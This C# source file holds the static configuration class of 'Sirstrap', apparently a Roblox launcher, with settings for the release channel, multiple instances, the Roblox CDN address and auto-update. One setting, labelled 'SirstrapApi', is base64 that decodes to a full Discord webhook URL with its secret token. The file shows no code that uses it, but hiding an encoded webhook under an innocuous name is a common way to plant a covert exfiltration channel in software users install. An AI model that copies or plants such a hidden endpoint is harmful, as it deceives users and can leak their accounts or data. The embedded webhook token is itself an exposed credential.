namespace Sirstrap.Core
{
    public static class SirstrapConfiguration
    {
        public static string ChannelName { get; set; } = "-beta";

        public static bool MultiInstance { get; set; } = true;

        public static bool RobloxApi { get; set; }

        public static string RobloxCdnUri { get; set; } = "https://setup.rbxcdn.com";

        public static string SirstrapApi { get; set; } = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNzY5NzE1ODIyNzg4NjE5MC8yNE9WUGNxakUyQzhlVnJuUkdZQVFQTUtudHlIRDlmOXVRMGt1ZjNUa2F3RFZyMk8zbFNYcTNnNG1yOTdjd2tpT1VweQ==";

        /// <summary>
        /// WIP
        /// </summary>
        public static bool Incognito { get; set; }

        public static bool AutoUpdate { get; set; } = true;
    }
}